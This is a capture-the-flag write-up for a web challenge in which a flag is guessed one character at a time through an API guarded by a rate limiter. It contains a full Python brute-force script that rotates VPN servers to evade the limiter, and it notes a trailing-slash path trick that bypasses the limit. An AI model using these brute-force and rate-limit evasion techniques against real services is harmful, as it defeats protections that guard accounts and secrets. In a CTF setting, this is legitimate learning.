#### Hit Your Limit
- points earned: 855
#### Where's the flag?
- There's no source code with this challenge so the flag location is unknown.
#### Solution
- The app is pretty simple and consists of an input box and some boxes below it that get populated with the characters typed into the box.
	- If the characters typed into the box match the characters in the flag then everything highlights in green
	- If the characters are incorrect then everything highlights in red
	- Each time a character is typed a request gets sent to `/api/flag?guess=<the flag>`
		- If the characters are correct, the reponse will be `{ "result": "correct" }`
		- If the characters are incorrect, the reponse will be `{ "result": "incorrect" }`
		- The app also utilizes a rate limiter and if the limit is reach then a response will be
			```json
			{
			    "error": "Rate limit exceeded",
			    "limit": 5,
			    "message": "Too many requests. Retry in 182s.",
			    "requests": 6
			}
			```
- The goal here is pretty clear: brute force the flag.  With the limiter, however, this will take too much time.
- I spent some time trying to get around the limiter, but was unable to come up with a way to do so.  My resolution was to utilize a vpn to work around the limiter.
- This didn't work amazingly well so I also ended up just guessing parts of the flag.
```python
import subprocess
import re
import string
import requests
import time



characters = string.ascii_letters + string.digits + '!@$^*()-_}'
# print(f'{characters=}')
url = 'http://23.179.17.92:5559/api/flag?guess='

class vpn:
    def __init__(self):
        countries = subprocess.getoutput('nordvpn cities United_States')
        countries = re.split(r'[ \n]', countries)
        countries = [c for c in countries if c != '']
        # print(f'{countries=}')
        self.countries = countries
        self.country_i = 0

    def connect(self):
        country = self.countries[self.country_i]
        print(f'--- vpn: connecting to {country}')
        output = subprocess.getoutput(f'nordvpn c United_States {country}')
        # print(output)
        if f'You are connected to' in output:
            print('--- vpn: success')
        else:
            print('--- vpn: failed')
            self.switch()
        time.sleep(5)

    def disconnect(self):
        print('--- vpn: disconnecting')
        output = subprocess.getoutput(f'nordvpn d')
        if 'You are disconnected from NordVPN' in output:
            print('--- vpn: success')
        else:
            print(print('--- vpn: failed'))
            exit()

    def switch(self):
        print('--- vpn: switching')
        self.country_i = (self.country_i + 1) % len(self.countries)
        self.connect()
v = vpn()

def doThing(f):
    try:
        r = requests.get(url + f, allow_redirects=False, timeout=10)
    except Exception as e:
        print(f'Exception: {e}')
        time.sleep(5)
        return -1

    if r.status_code == 200 and r.json().get('result', False) == 'correct':
        return True
    elif r.status_code == 400 and r.json().get('result', False) == 'incorrect':
        return False
    elif r.status_code == 429 and r.json().get('error', False) == 'Rate limit exceeded':
        print('--- rate limit hit')
        v.switch()
        # doThing(f)
        return -1
    else:
        print(f'--- unexpected result')
        print(f'{r.status_code=}')
        print(f'{r.headers=}')
        print(f'{r.text=}')
        # doThing(f)
        return -1

v.connect()
flag = 'CIT{R@T3_L1m1t1nG_15_Bypass'

for i in range(32 - len(flag)):
    while True:
        for c in characters:
            attempt = flag + c
            while True:
                success = doThing(attempt)
                if success == -1:
                    continue
                if success:
                    print(f'[{attempt}] :)')
                    flag = attempt
                    break
                else:
                    print(f'[{attempt}] :(')
                    if c == characters[-1]:
                        exit()
                    break
            if flag == attempt:
                break
            if flag[-1] == '}':
                print(f'[{flag}] Done.')
                exit()
```

#### The correct solution
- After the CTF ended I learned (from the challenge author 10splayaSec) that the limiter was bypassable by simply adding a `/` to the and of the URI.
```
/api/flag/?guess=<the flag>
```
- 🤦